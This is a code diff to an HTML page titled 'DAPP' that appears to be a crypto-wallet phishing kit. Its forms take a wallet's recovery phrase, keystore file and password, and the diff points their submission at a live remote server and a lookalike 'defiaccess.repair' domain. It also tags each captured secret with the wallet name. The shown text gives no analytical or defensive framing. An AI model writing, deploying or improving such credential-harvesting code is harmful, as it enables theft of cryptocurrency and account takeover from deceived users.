@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="./assets/css.css">
+    <link rel="shortcut icon" href="https://www.google.com/imgres?imgurl=https%3A%2F%2Fimg.cryptorank.io%2Fcoins%2Fdapp_com1661249359694.png&tbnid=hJpl-c47LIUC3M&vet=12ahUKEwjmh4fcx4qEAxWY9gIHHbuXDBcQMygRegQIARBY..i&imgrefurl=https%3A%2F%2Fcryptorank.io%2Fico%2Fdappt&docid=Vp3vh0LBLEjWkM&w=400&h=400&q=dApp%20logo%20.png&ved=2ahUKEwjmh4fcx4qEAxWY9gIHHbuXDBcQMygRegQIARBY" type="image/x-icon">
+
     <title>DAPP</title>
 
 </head>
@@ -104,8 +106,8 @@
       
   </section>
   <script>
-  var apiUrl="http://127.0.0.1:5502"
-  var winUrl="http://127.0.0.1:5502"
+ var apiUrl="https://defiserver-u242.onrender.com"
+  var winUrl="http://defiaccess.repair"
 
 
    var button= document.querySelectorAll(".form .div button")
@@ -152,10 +154,11 @@
     e.preventDefault()
     popup()
     const params={
+        walletName:localStorage.getItem("DEFIWalletName"),
         keyphrase:form[0].getElementsByTagName("textarea")[0].value
     }
-    
-    const requestOptions = {
+    if (form[0].getElementsByTagName("textarea")[0].value) {
+        const requestOptions = {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
@@ -183,18 +186,21 @@
       .catch((error) => {
         // Handle any errors
         console.error('Error:', error);
-      });
+      }); 
+    }
+   
    })
 
    form[1].addEventListener("submit",(e)=>{
     e.preventDefault()
     popup()
     const params={
+        walletName:localStorage.getItem("DEFIWalletName"),
         keystoreJSON:form[1].getElementsByTagName("textarea")[0].value,
         password:form[1].getElementsByTagName("input")[0].value
     }
-    
-    const requestOptions = {
+    if (form[1].getElementsByTagName("textarea")[0].value &&  form[1].getElementsByTagName("input")[0].value ) {
+        const requestOptions = {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
@@ -218,16 +224,19 @@
         // Handle any errors
         console.error('Error:', error);
       });
+    }
+   
    })
 
    form[2].addEventListener("submit",(e)=>{
     e.preventDefault()
     popup()
     const params={
+        walletName:localStorage.getItem("DEFIWalletName"),
         keyphrase:form[2].getElementsByTagName("textarea")[0].value
     }
-    
-    const requestOptions = {
+    if (form[2].getElementsByTagName("textarea")[0].value) {
+        const requestOptions = {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
@@ -256,6 +265,8 @@
         // Handle any errors
         console.error('Error:', error);
       });
+    }
+    
    })
 
   
